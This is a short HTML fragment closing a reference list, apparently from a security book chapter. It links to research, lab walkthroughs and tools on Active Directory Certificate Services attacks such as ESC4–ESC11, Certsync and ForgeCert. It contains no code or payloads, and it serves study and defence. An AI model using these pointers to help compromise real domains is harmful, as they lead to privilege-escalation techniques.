<li>Detecting <span class="No-Break">ESC4: </span><a href="https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4"><span class="No-Break">https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4</span></a></li>
<li>Certsync <span class="No-Break">attack: </span><a href="https://www.redpacketsecurity.com/certsync-dump-ntds-with-golden-certificates-and-unpac-the-hash/"><span class="No-Break">https://www.redpacketsecurity.com/certsync-dump-ntds-with-golden-certificates-and-unpac-the-hash/</span></a></li>
<li>SpecterOps – From DA to EA with <span class="No-Break">ESC5: </span><a href="https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c"><span class="No-Break">https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c</span></a></li>
<li>PSPKI to turn ESC7 to <span class="No-Break">ESC6: </span><a href="https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc7"><span class="No-Break">https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc7</span></a></li>
<li>From ManageCA to <span class="No-Break">RCE: </span><span class="No-Break">https://www.tarlogic.com/blog/ad-cs-manageca-rce/</span></li>
<li>ESC8 exploitation <span class="No-Break">versions: </span><span class="No-Break">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#esc8---ad-cs-relay-attack</span></li>
<li>AD CS GOADv2 lab <span class="No-Break">walk-through: </span><span class="No-Break">https://mayfly277.github.io/posts/GOADv2-pwning-part6/#esc8---coerce-to-domain-admin</span></li>
<li>ESC11 original <span class="No-Break">research: </span><span class="No-Break">https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/</span></li>
<li>ForgeCert <span class="No-Break">tool: </span><span class="No-Break">https://github.com/GhostPack/ForgeCert</span></li>
</ol>
</div>
</div></body></html>